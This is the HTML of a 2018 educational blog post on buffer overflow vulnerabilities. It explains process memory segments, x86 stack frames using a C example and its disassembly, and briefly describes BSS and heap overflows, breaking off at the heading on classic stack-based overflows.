@@ -1,0 +1,1390 @@
+<!doctype html>
+<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
+<!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8" lang="en"><![endif]-->
+<!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9" lang="en"><![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en"><!--<![endif]-->
+<!--<script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script>-->
+<!--<script type="text/x-mathjax-config">MathJax.Hub.Config({ TeX: { equationNumbers: {autoNumber: "AMS"} } });</script>-->
+<head>
+<script type="text/javascript" async
+  src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<script type="text/x-mathjax-config">MathJax.Hub.Config({ TeX: { equationNumbers: {autoNumber: "AMS"} } });</script>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+<script>
+  function resizeIframe(obj) {
+    obj.style.height = obj.contentWindow.document.body.scrollHeight + 'px';
+  }
+</script>
+
+<meta charset="utf-8">
+<title>Buffer Overflow Vulnerabilities &#8211; ML & Stats</title>
+<meta name="description" content="Describe your website here.">
+<meta name="keywords" content="">
+
+
+
+<!-- Open Graph -->
+<meta property="og:locale" content="en">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Buffer Overflow Vulnerabilities">
+<meta property="og:description" content="Describe your website here.">
+<meta property="og:url" content="https://MarkusThill.github.io/buffer-overflows/">
+<meta property="og:site_name" content="ML & Stats">
+<meta property="og:image" content="https://MarkusThill.github.io/images/stack.jpg">
+
+
+
+
+
+
+<link rel="canonical" href="https://MarkusThill.github.io/buffer-overflows/">
+<link href="https://MarkusThill.github.io/feed.xml" type="application/atom+xml" rel="alternate" title="ML & Stats Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no"/>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="https://MarkusThill.github.io/assets/css/main.css">
+<link rel="stylesheet" href="https://MarkusThill.github.io/assets/css/jquery.mmenu.all.css">
+<link rel="stylesheet" href="https://MarkusThill.github.io/assets/css/jquery.floating-social-share.min.css">
+<!-- Webfonts -->
+<link href="//fonts.googleapis.com/css?family=Lato:300,400,700,300italic,400italic" rel="stylesheet" type="text/css">
+
+<meta http-equiv="cleartype" content="on">
+
+<!-- Load Modernizr -->
+<script type="text/javascript" src="https://MarkusThill.github.io/assets/js/vendor/modernizr-2.6.2.custom.min.js"></script>
+
+<!-- Icons -->
+<!-- 16x16 -->
+<link rel="shortcut icon" href="https://MarkusThill.github.io/favicon.ico">
+<!-- 32x32 -->
+<link rel="shortcut icon" href="https://MarkusThill.github.io/favicon.png">
+<!-- 57x57 (precomposed) for iPhone 3GS, pre-2011 iPod Touch and older Android devices -->
+<link rel="apple-touch-icon-precomposed" href="https://MarkusThill.github.io/images/apple-touch-icon-precomposed.png">
+<!-- 72x72 (precomposed) for 1st generation iPad, iPad 2 and iPad mini -->
+<link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://MarkusThill.github.io/images/apple-touch-icon-72x72-precomposed.png">
+<!-- 114x114 (precomposed) for iPhone 4, 4S, 5 and post-2011 iPod Touch -->
+<link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://MarkusThill.github.io/images/apple-touch-icon-114x114-precomposed.png">
+<!-- 144x144 (precomposed) for iPad 3rd and 4th generation -->
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://MarkusThill.github.io/images/apple-touch-icon-144x144-precomposed.png">
+
+
+
+
+<!--<link rel="stylesheet" type="text/css" href="https://cdn.rawgit.com/dreampulse/computer-modern-web-font/master/fonts.css">-->
+<link rel="stylesheet" href="/fonts/cmun-serif.css"></link>
+
+<!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>Buffer Overflow Vulnerabilities | ML &amp; Stats</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="Buffer Overflow Vulnerabilities" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Buffer overflows continue to be one of the most common security vulnerabilities in current software and are usually the result of incorrectly constructed programs. Buffer overflows occur when too small memory areas are reserved for a given amount of data, which usually overwrites adjacent areas of the memory, which can also contain sensitive data, among other things. Sensitive data is information for controlling the program flow or the process memory, but also pointers. Buffer overflows are critical vulnerabilities in software because attackers can often manipulate sensitive data in such a way that infected malware can be successfully executed on the target system. Most of today’s computer systems are based on the Von-Neumann architecture. With such systems, data and programs are stored in the same memory, making it easy for attackers to exploit buffer overflow vulnerabilities. However, the weak points in themselves only arise through negligent programming, the exploitation of which is merely fostered by the von Neumann architecture. In many programming languages, such as C / C++, the check for memory overflows is usually left to the programmer, who often forgets it completely or implements it incorrectly. Buffer overflows in JAVA are practically impossible, since the programs run in a runtime that detects and prevents memory area overflows. Also, interpreted programming languages are rarely affected. In order to keep things simple, in this blog post we will take a look at buffer overflows on x86/IA-32 architectures. However, for newer architectures the techniques discussed here are very similar." />
+<meta property="og:description" content="Buffer overflows continue to be one of the most common security vulnerabilities in current software and are usually the result of incorrectly constructed programs. Buffer overflows occur when too small memory areas are reserved for a given amount of data, which usually overwrites adjacent areas of the memory, which can also contain sensitive data, among other things. Sensitive data is information for controlling the program flow or the process memory, but also pointers. Buffer overflows are critical vulnerabilities in software because attackers can often manipulate sensitive data in such a way that infected malware can be successfully executed on the target system. Most of today’s computer systems are based on the Von-Neumann architecture. With such systems, data and programs are stored in the same memory, making it easy for attackers to exploit buffer overflow vulnerabilities. However, the weak points in themselves only arise through negligent programming, the exploitation of which is merely fostered by the von Neumann architecture. In many programming languages, such as C / C++, the check for memory overflows is usually left to the programmer, who often forgets it completely or implements it incorrectly. Buffer overflows in JAVA are practically impossible, since the programs run in a runtime that detects and prevents memory area overflows. Also, interpreted programming languages are rarely affected. In order to keep things simple, in this blog post we will take a look at buffer overflows on x86/IA-32 architectures. However, for newer architectures the techniques discussed here are very similar." />
+<link rel="canonical" href="https://markusthill.github.io/buffer-overflows/" />
+<meta property="og:url" content="https://markusthill.github.io/buffer-overflows/" />
+<meta property="og:site_name" content="ML &amp; Stats" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2018-02-05T12:18:34+01:00" />
+<script type="application/ld+json">
+{"description":"Buffer overflows continue to be one of the most common security vulnerabilities in current software and are usually the result of incorrectly constructed programs. Buffer overflows occur when too small memory areas are reserved for a given amount of data, which usually overwrites adjacent areas of the memory, which can also contain sensitive data, among other things. Sensitive data is information for controlling the program flow or the process memory, but also pointers. Buffer overflows are critical vulnerabilities in software because attackers can often manipulate sensitive data in such a way that infected malware can be successfully executed on the target system. Most of today’s computer systems are based on the Von-Neumann architecture. With such systems, data and programs are stored in the same memory, making it easy for attackers to exploit buffer overflow vulnerabilities. However, the weak points in themselves only arise through negligent programming, the exploitation of which is merely fostered by the von Neumann architecture. In many programming languages, such as C / C++, the check for memory overflows is usually left to the programmer, who often forgets it completely or implements it incorrectly. Buffer overflows in JAVA are practically impossible, since the programs run in a runtime that detects and prevents memory area overflows. Also, interpreted programming languages are rarely affected. In order to keep things simple, in this blog post we will take a look at buffer overflows on x86/IA-32 architectures. However, for newer architectures the techniques discussed here are very similar.","headline":"Buffer Overflow Vulnerabilities","dateModified":"2018-02-05T12:18:34+01:00","datePublished":"2018-02-05T12:18:34+01:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://markusthill.github.io/buffer-overflows/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"https://markusthill.github.io/images/logo.png"}},"url":"https://markusthill.github.io/buffer-overflows/","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body id="post" class="feature">
+
+<!--[if lt IE 9]><div class="upgrade"><strong><a href="https://whatbrowser.org/">Your browser is quite old!</strong> Why not upgrade to a different browser to better enjoy this site?</a></div><![endif]-->
+
+
+
+<div class="header-menu header-menu-top">
+    <ul class="header-item-container">
+      <li class="header-item-title header-toggle "><a href="#menu"><h2><i class="fa fa-bars"></i></h2></a></li>
+      <li class="header-item-title">
+        <a href="https://MarkusThill.github.io/">
+          
+            <img class="logo" src="https://MarkusThill.github.io/images/logo.png" alt="ML & Stats">
+          
+          <a href="https://MarkusThill.github.io/" class="title"> ML & Stats</a>
+        </a>
+      </li>
+      
+        
+        
+
+        
+            
+                <li class="header-item "><a href="https://MarkusThill.github.io/posts"><h3>Posts</h3></a></li>
+            
+        
+      
+        
+        
+
+        
+          <li class="header-item "><a href="https://MarkusThill.github.io/categories"><h3>Categories</h3></a>
+            <ul class="header-submenu">
+              
+                
+                  <li class="sub-item"><a href="https://MarkusThill.github.io/categories/#Electronics">Electronics</a></li>
+              
+                
+                  <li class="sub-item"><a href="https://MarkusThill.github.io/categories/#ML">ML</a></li>
+              
+                
+                  <li class="sub-item"><a href="https://MarkusThill.github.io/categories/#Math">Math</a></li>
+              
+                
+                  <li class="sub-item"><a href="https://MarkusThill.github.io/categories/#Programming">Programming</a></li>
+              
+                
+                  <li class="sub-item"><a href="https://MarkusThill.github.io/categories/#Stats">Stats</a></li>
+              
+                
+                  <li class="sub-item"><a href="https://MarkusThill.github.io/categories/#Template">Template</a></li>
+              
+                
+                  <li class="sub-item"><a href="https://MarkusThill.github.io/categories/#Vector Algebra">Vector Algebra</a></li>
+              
+            </ul>
+          </li>
+        
+      
+        
+        
+
+        
+            
+                <li class="header-item "><a href="https://MarkusThill.github.io/tags"><h3>Tags</h3></a></li>
+            
+        
+      
+        
+        
+
+        
+            
+                <li class="header-item "><a href="https://MarkusThill.github.io/markus"><h3>About</h3></a></li>
+            
+        
+      
+        
+        
+
+        
+            
+                <li class="header-item "><a href="https://MarkusThill.github.io/"><h3>Home</h3></a></li>
+            
+        
+      
+      <li class="header-item"><a href="https://MarkusThill.github.io/search"><h3><i class="fa fa-search"></i></h3></a></li>
+    </ul>
+  </div>
+<div class="entry-header">
+  <div class="header-title">
+    <div class="header-title-wrap">
+      <h1>Buffer Overflow Vulnerabilities</h1>
+      
+        <h2><span class="entry-date date published updated"><time datetime="2018-02-05T12:18:34+01:00">February 05, 2018</time></span></h2>
+      
+
+      
+        <p class="entry-reading-time">
+          <i class="fa fa-clock-o"></i>
+          
+          Reading time ~42 minutes
+        </p><!-- /.entry-reading-time -->
+      
+    </div><!-- /.header-title-wrap -->
+  </div><!-- /.header-title -->
+</div><!-- /.entry-header -->
+
+
+<nav id="menu" style="display: none">
+  <ul>
+    
+      
+        <li><a href="https://MarkusThill.github.io/"><h3>Home</h3></a></li>
+      
+    
+      
+        <li><a href="https://MarkusThill.github.io/markus"><h3>About</h3></a></li>
+      
+    
+      
+        <li><a href="https://MarkusThill.github.io/tags"><h3>Tags</h3></a></li>
+      
+    
+      
+        <li><a href="https://MarkusThill.github.io/categories"><h3>Categories</h3></a>
+          <ul>
+            
+              
+                <li><a href="https://MarkusThill.github.io/categories/#Electronics">Electronics</a></li>
+            
+              
+                <li><a href="https://MarkusThill.github.io/categories/#ML">ML</a></li>
+            
+              
+                <li><a href="https://MarkusThill.github.io/categories/#Math">Math</a></li>
+            
+              
+                <li><a href="https://MarkusThill.github.io/categories/#Programming">Programming</a></li>
+            
+              
+                <li><a href="https://MarkusThill.github.io/categories/#Stats">Stats</a></li>
+            
+              
+                <li><a href="https://MarkusThill.github.io/categories/#Template">Template</a></li>
+            
+              
+                <li><a href="https://MarkusThill.github.io/categories/#Vector Algebra">Vector Algebra</a></li>
+            
+          </ul>
+        </li>
+      
+    
+      
+        <li><a href="https://MarkusThill.github.io/posts"><h3>Posts</h3></a></li>
+      
+    
+  </ul>
+</nav>
+
+
+
+
+<div id="main" role="main">
+  <article class="hentry">
+    <div class="entry-content">
+        
+            <div class="entry-image-index">
+              <img src="https://MarkusThill.github.io/images/stack.jpg" alt="Buffer Overflow Vulnerabilities">
+              
+            </div>
+        
+      <h1 class="post-title entry-title">Buffer Overflow Vulnerabilities</h1>
+      <p>Buffer overflows continue to be one of the most common security vulnerabilities in current software and are usually the result of incorrectly constructed programs. Buffer overflows occur when too small memory areas are reserved for a given amount of data, which usually overwrites adjacent areas of the memory, which can also contain sensitive data, among other things.
+Sensitive data is information for controlling the program flow or the process memory, but also pointers.
+Buffer overflows are critical vulnerabilities in software because attackers can often manipulate sensitive data in such a way that infected malware can be successfully executed on the target system.
+Most of today’s computer systems are based on the Von-Neumann architecture. With such systems, data and programs are stored in the same memory, making it easy for attackers to exploit buffer overflow vulnerabilities. However, the weak points in themselves only arise through negligent programming, the exploitation of which is merely fostered by the von Neumann architecture. In many programming languages, such as C / C++, the check for memory overflows is usually left to the programmer, who often forgets it completely or implements it incorrectly. <br />
+Buffer overflows in JAVA are practically impossible, since the programs run in a runtime that detects and prevents memory area overflows. Also, interpreted programming languages are rarely affected.</p>
+
+<p>In order to keep things simple, in this blog post we will take a look at buffer overflows on x86/IA-32 architectures. However, for newer architectures the techniques discussed here are very similar.</p>
+
+<!--more-->
+
+<h2 id="process-memory-organization">Process memory organization</h2>
+<p>In order to understand the attack methods that exploit different buffer overflow vulnerabilities, it is necessary to first discuss the organization of the process memory in more detail.
+Typically, a process is provided with its own virtual address space by the operating system, with which it can work. For 32-bit systems, for example, the virtual address space can comprise up to <script type="math/tex">2^{32}</script> addresses. Few processes will require the complete virtual address space. Therefore, it is not necessary and often impossible to assign a physical address to each virtual address. If necessary, the memory management unit (MMU) of the CPU will convert the virtual addresses into physical addresses.
+The memory of a process is divided into different areas. These areas are described in more detail below.</p>
+
+<p>Text segment: The executable code of the program is stored in the text segment. This segment can usually only be accessed read-only, write operations are prohibited and lead to an error. A manipulation of the code at runtime is therefore impossible. Literals and constant pointers are usually also stored in this segment.</p>
+
+<p>Data segment: In general, all global and static variables are stored in the data segment of the process memory. Static variables are declared locally in functions, but the value of the variables remains the same when you exit the function, so they cannot be placed on the stack like classic local variables.
+In the data segment itself, a distinction is often made between the two areas Data and BSS (Block Start by Symbol). The initialized global and static variables are stored in the data area, the non-initialized variables are stored in the BSS area. The BSS area is usually completely null, so variables that were not initialized by the programmer do not contain any unexpected values.</p>
+
+<p>Heap: At the runtime of a process, memory can be dynamically allocated and released on the heap. The heap is used if the memory on the stack is not sufficient or the required size of data structures can only be determined at runtime.</p>
+
+<p>Stack: As mentioned above, unlike global variables, local variables are placed on the stack. The stack can be imagined as a pile. Elements can be placed on top of the stack or removed from above.<br />
+The stack is usually supported directly by the hardware of the common processor architectures and plays a prominent role in memory management, especially when functions / procedures are called. In the following chapter we will therefore go into more detail on this topic.
+In most processor architectures, the stack grows from the highest virtual memory address to the lower one. The growth direction of the heap is exactly the opposite. Usually, the process memory layout will look something like this:</p>
+
+<p><img src="/images/2018-02-05-buffer-overflows/memoryOrga.png" alt="" class="image-center" width="300px" /></p>
+
+<h2 id="intel-x86ia-32-architecture">Intel x86/IA-32 architecture</h2>
+<p>In general, processor architectures can be divided into the genera Little-Endian and Big-Endian. The class determines the sequence in which multibyte data is stored in memory.  Little-Endian architectures store the “Most Significant Byte” (MSB) to a higher address of the memory area and the “Least Siginificant Byte” (LSB) to a lower address. Big-Endian machines work exactly the opposite way. The Intel x86/IA-32 architecture we are looking at uses the Little-Endian representation. This property will play a significant role in off-by-one overflows.</p>
+
+<h3 id="base-registers">Base Registers</h3>
+<p>The base registers include the registers EAX, EBX, ECX, EDX, ESP, EBP, ESI and EDI. The individual functions of the registers are not relevant for understanding the assembler codes. Only the registers ESP and EBP are to be examined in more detail here.
+The ESP register (Extended Stack Pointer) is a pointer to the current position in the stack. The stack pointer is changed with the operations push (putting an element on the stack) and pop (reading the last element from the stack). Direct manipulation of the stack pointer is also possible.
+The EBP (Extended Base Pointer, often simply frame pointer) register also plays an important role in stack operations. When a function is executed, this register is defined as the base address for stack operations within the function.
+The value of the frame pointer always remains the same when a function is executed. The value is not changed to the corresponding address of the new function until you leave a function. For example, it is possible to address local variables on the stack easily via relative offsets to the frame pointer. The area of the stack delimited by the frame pointer and stack pointer is also known as the stack frame.</p>
+
+<h2 id="how-the-stack-works">How the Stack works</h2>
+<p>The following is a simple example of how the stack works. A small C-program serves as an example:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">foo</span><span class="p">(</span><span class="kt">int</span> <span class="n">x</span><span class="p">,</span> <span class="kt">int</span> <span class="n">y</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kt">char</span> <span class="n">buff2</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
+	<span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+	<span class="n">i</span> <span class="o">=</span> <span class="n">x</span> <span class="o">+</span> <span class="n">y</span><span class="p">;</span>
+ 	<span class="k">return</span> <span class="n">i</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
+	<span class="n">foo</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">9</span><span class="p">);</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>For this code, you get the following assembler output:</p>
+
+<p>Function <code class="highlighter-rouge">main()</code>:</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">1</span>	<span class="k">push</span>   <span class="err">%</span><span class="n">ebp</span>
+<span class="mi">2</span>	<span class="k">mov</span>    <span class="err">%</span><span class="n">esp</span><span class="p">,</span><span class="err">%</span><span class="n">ebp</span>
+<span class="mi">3</span>	<span class="k">sub</span>    <span class="err">$</span><span class="mh">0x18</span><span class="p">,</span><span class="err">%</span><span class="n">esp</span>
+<span class="mi">4</span>	<span class="k">sub</span>    <span class="err">$</span><span class="mh">0x8</span><span class="p">,</span><span class="err">%</span><span class="n">esp</span>
+<span class="mi">5</span>	<span class="k">push</span>   <span class="err">$</span><span class="mh">0x9</span>
+<span class="mi">6</span>	<span class="k">push</span>   <span class="err">$</span><span class="mh">0x1</span>
+<span class="mi">7</span>	<span class="k">call</span>   <span class="mh">0x8048430</span> <span class="o">&lt;</span><span class="n">foo</span><span class="o">&gt;</span>
+<span class="mi">8</span>	<span class="k">add</span>    <span class="err">$</span><span class="mh">0x10</span><span class="p">,</span><span class="err">%</span><span class="n">esp</span>
+<span class="mi">9</span>	<span class="k">mov</span>    <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span>
+<span class="mi">10</span>	<span class="k">leave</span>
+<span class="mi">11</span>	<span class="k">ret</span></code></pre></figure>
+
+<p>Function <code class="highlighter-rouge">foo()</code>:</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">1</span>	<span class="k">push</span>   <span class="err">%</span><span class="n">ebp</span>
+<span class="mi">2</span>	<span class="k">mov</span>    <span class="err">%</span><span class="n">esp</span><span class="p">,</span><span class="err">%</span><span class="n">ebp</span>
+<span class="mi">3</span>	<span class="k">sub</span>    <span class="err">$</span><span class="mh">0x38</span><span class="p">,</span><span class="err">%</span><span class="n">esp</span>
+<span class="mi">4</span>	<span class="k">mov</span>    <span class="mh">0xc</span><span class="p">(</span><span class="err">%</span><span class="n">ebp</span><span class="p">),</span><span class="err">%</span><span class="n">eax</span>
+<span class="mi">5</span>	<span class="k">add</span>    <span class="mh">0x8</span><span class="p">(</span><span class="err">%</span><span class="n">ebp</span><span class="p">),</span><span class="err">%</span><span class="n">eax</span>
+<span class="mi">6</span>	<span class="k">mov</span>    <span class="err">%</span><span class="n">eax</span><span class="p">,</span><span class="mh">0xffffffd4</span><span class="p">(</span><span class="err">%</span><span class="n">ebp</span><span class="p">)</span>
+<span class="mi">7</span>	<span class="k">mov</span>    <span class="mh">0xffffffd4</span><span class="p">(</span><span class="err">%</span><span class="n">ebp</span><span class="p">),</span><span class="err">%</span><span class="n">eax</span>
+<span class="mi">8</span>	<span class="k">mov</span>    <span class="err">%</span><span class="n">eax</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span>
+<span class="mi">9</span>	<span class="k">leave</span>
+<span class="mi">10</span>	<span class="k">ret</span></code></pre></figure>
+
+<p>First, an explanation of the main function:</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">1</span> <span class="k">push</span> <span class="err">%</span><span class="n">ebp</span>
+<span class="mi">2</span> <span class="k">mov</span> <span class="err">%</span><span class="n">esp</span><span class="p">,</span> <span class="err">%</span><span class="n">ebp</span></code></pre></figure>
+
+<p>The first two lines can be found in this form in practically all functions. In line one the current frame pointer (in the following also FP) FP0 is placed on the stack. The stack pointer is then moved to the EBP register in line two. At this address the stack frame of <code class="highlighter-rouge">main()</code> starts.</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">3</span> <span class="k">sub</span> <span class="err">$</span><span class="mh">0x18</span><span class="p">,</span> <span class="err">%</span><span class="n">esp</span>
+<span class="mi">4</span> <span class="k">sub</span> <span class="err">$</span><span class="mh">0x8</span><span class="p">,</span> <span class="err">%</span><span class="n">esp</span></code></pre></figure>
+
+<p>These two commands reserve memory space for the local variables i and buff on the stack. The sub operation performs a subtraction so that the stack pointer is moved towards lower addresses. In lines three and four, the total value 0x20 (dec: 32) is subtracted from the ESP register. In this case, the stack pointer is manipulated directly. Since the stack grows from higher to lower addresses, a subtraction must be performed and not an addition. The fact that more memory is reserved than necessary should not be discussed here, but will be looked at below.</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">5</span> <span class="k">push</span> <span class="err">$</span><span class="mh">0x9</span>
+<span class="mi">6</span> <span class="k">push</span> <span class="err">$</span><span class="mh">0x1</span></code></pre></figure>
+
+<p>The next step is to prepare the function call of foo. The function expects two parameters to be placed on the stack in rows five and six. It is important that the parameters must be transferred in reverse order to those in the C program.</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">7</span> <span class="k">call</span> <span class="mh">0x8048430</span> <span class="o">&lt;</span><span class="n">foo</span><span class="o">&gt;</span></code></pre></figure>
+
+<p>After passing the parameters, we can branch to the <code class="highlighter-rouge">foo()</code> function. The CALL instruction performs two steps. First, the return address (hereafter: RIP) is placed on the stack. This contains the address of the instruction to be executed after leaving <code class="highlighter-rouge">foo()</code>, in this case the address of line eight of the <code class="highlighter-rouge">main()</code> function. In the second step, the instruction register EIP (Extended Instruction Pointer) is then adapted and the program execution in <code class="highlighter-rouge">foo()</code> is resumed. The stack looks like this at this point in time:</p>
+
+<p><img src="/images/2018-02-05-buffer-overflows/stack7.png" alt="" class="image-center" width="750px" /></p>
+
+<p>As already mentioned, the program flow is now continued in the function <code class="highlighter-rouge">foo()</code>:</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">1</span> <span class="k">push</span> <span class="err">%</span><span class="n">ebp</span>
+<span class="mi">2</span> <span class="k">mov</span> <span class="err">%</span><span class="n">esp</span><span class="p">,</span> <span class="err">%</span><span class="n">ebp</span></code></pre></figure>
+
+<p>The first lines correspond to those of the main function. The current frame pointer (FP1) must be saved to the stack and later read back from the stack when returning to <code class="highlighter-rouge">main()</code>.</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">3</span> <span class="k">sub</span> <span class="err">$</span><span class="mh">0x38</span><span class="p">,</span> <span class="err">%</span><span class="n">esp</span></code></pre></figure>
+
+<p>In line three, memory is reserved for the local variables on the stack by manipulating the stack pointer.</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">4</span> <span class="k">mov</span> <span class="mh">0xc</span> <span class="p">(</span><span class="err">%</span><span class="n">ebp</span><span class="p">),</span> <span class="err">%</span><span class="n">eax</span>
+<span class="mi">5</span> <span class="k">add</span> <span class="mh">0x8</span> <span class="p">(</span><span class="err">%</span><span class="n">ebp</span><span class="p">),</span> <span class="err">%</span><span class="n">eax</span>
+<span class="mi">6</span> <span class="k">mov</span> <span class="err">%</span><span class="n">eax</span><span class="p">,</span><span class="mh">0xffffffd4</span><span class="p">(</span><span class="err">%</span><span class="n">ebp</span><span class="p">)</span></code></pre></figure>
+
+<p>Line four instructs the CPU to load the parameter y into the EAX register. At this point the task of the frame pointer becomes clear. Access to the transferred parameters is not performed with absolute addresses, but relative to the frame pointer. The parameter y is exactly 12 (0xc) bytes above the frame pointer. In between there is the parameter x, the return address and the last saved frame pointer. In the second step, parameter x is added to the value in the EAX register.
+Third, the EAX register is written to the local variable i. In this case, the offset to the frame pointer is of course negative (two’s complement representation).</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">7</span> <span class="k">mov</span> <span class="mh">0xffffffd4</span><span class="p">(</span><span class="err">%</span><span class="n">ebp</span><span class="p">),</span><span class="err">%</span><span class="n">eax</span>
+<span class="mi">8</span> <span class="k">mov</span> <span class="err">%</span><span class="n">eax</span><span class="p">,</span> <span class="err">%</span><span class="n">eax</span></code></pre></figure>
+
+<p>Lines seven and eight are normally no longer necessary. Probably they should write the function’s return value to the EAX register (numeric return values are almost always written to the EAX register). However, since the return value is already in the EAX register, these lines could also be omitted.
+The stack now looks like this:</p>
+
+<p><img src="/images/2018-02-05-buffer-overflows/stack8.png" alt="" class="image-center" width="750px" /></p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">9</span> <span class="k">leave</span></code></pre></figure>
+
+<p>Line nine prepares to leave the function and can be replaced by the following two statements:</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="n">movl</span> <span class="err">%</span><span class="n">ebp</span><span class="p">,</span> <span class="err">%</span><span class="n">esp</span>
+<span class="n">popl</span> <span class="err">%</span><span class="n">ebp</span></code></pre></figure>
+
+<p>The LEAVE statement therefore causes the stack pointer to be set to the value of the frame pointer. The old frame pointer is then located exactly at the address of the stack pointer. This is written back to the EBP register by the POP instruction.
+10 ret
+After the LEAVE instruction, the stack pointer points to the previously stored return address. This is now loaded into the instruction register with the RET statement in line ten and the program flow in <code class="highlighter-rouge">main()</code> is continued.
+In <code class="highlighter-rouge">main()</code>, the last four instructions are finally processed:</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">8</span> <span class="k">add</span> <span class="err">$</span><span class="mh">0x10</span><span class="p">,</span> <span class="err">%</span><span class="n">esp</span></code></pre></figure>
+
+<p>After the function call, the function parameters must be removed from the stack because they are no longer needed. This is done by line eight of the main function. Why removing 16 instead of the eight bytes (two parameters with four bytes each) from the stack has the following reason:
+After some tests it turned out that before each function call, eight more bytes are reserved on the stack (see line four). Presumably the reservation is related to the bug of the used GCC compiler discussed below. In addition to the parameters, these eight additional bytes must be removed from the stack.
+After the function call of <code class="highlighter-rouge">foo()</code>, no further operations are performed in the <code class="highlighter-rouge">main()</code> function, cleaning up the stack is not mandatory in this case. However, you can easily recognize the functionality of function calls and stack.</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">9</span>  <span class="k">mov</span> <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span> <span class="err">%</span><span class="n">eax</span>
+<span class="mi">10</span> <span class="k">leave</span>
+<span class="mi">11</span> <span class="k">ret</span></code></pre></figure>
+
+<p>In the last lines, a return value of zero of the main function is defined (line nine) and the function is terminated. Stack and frame pointers are adjusted (line ten) and the <code class="highlighter-rouge">main()</code> function is terminated by loading a given return address from the stack into the instruction register (line eleven).</p>
+
+<p>The whole example is also illustrated again in the following animation (slightly simplified):</p>
+
+<center><iframe class="slideshow-iframe" src="https://MarkusThill.github.io/slides/animateStack.html" style="width:750px" frameborder="0" scrolling="no" onload="resizeIframe(this)"></iframe></center>
+
+<h1 id="buffer-overflows">Buffer overflows</h1>
+
+<h2 id="classification">Classification</h2>
+<p>Essentially, there are four generations of buffer overflows that can be used to compromise a system. This work deals in particular with classic stack-based and off-by-one-overflows, but for the sake of completeness BSS overflows and heap overflows should be briefly mentioned.</p>
+
+<h2 id="bss-overflows">BSS overflows</h2>
+<p>As mentioned above, the non-initialized global and static variables of the program are stored in the BSS area. In contrast to the stack, the BSS area is growing upwards. Therefore, higher memory locations may be overwritten by a buffer overflow. However, since, unlike the stack, no administrative information such as return addresses are stored in the BSS area, it is much more difficult for an attacker to exploit this type of vulnerability. One possibility, however, can be to overwrite pointers in order to redirect the program flow successfully (rarely possible) or to manipulate file pointers (e. g. more likely). If an attacker succeeds in manipulating a file pointer, he may be able to customize system files for his own benefit (e. g. make entries in /etc/passwd).</p>
+
+<h2 id="heap-overflows">Heap overflows</h2>
+<p>On the heap, library functions such as <code class="highlighter-rouge">malloc()</code> can be used to reserve memory blocks dynamically (i. e. at runtime). Like the BSS area, the heap grows towards higher addresses. When you reserve memory for a dynamic buffer, in addition to the required memory, certain administrative information concerning the buffer is also created on the heap. Since this administrative information is always appended directly to the corresponding buffer, it can be overwritten during a heap overflow. This often results in a program crash. As with BSS overflows, manipulation of the program flow is difficult, but under certain circumstances it is possible to overwrite any memory address in the process memory (e. g. jumpback addresses on the stack). Some operating systems prevent program code from running on the heap.</p>
+
+<h2 id="classic-stack-based-buffer-overflows">Classic stack-based Buffer Overflows</h2>
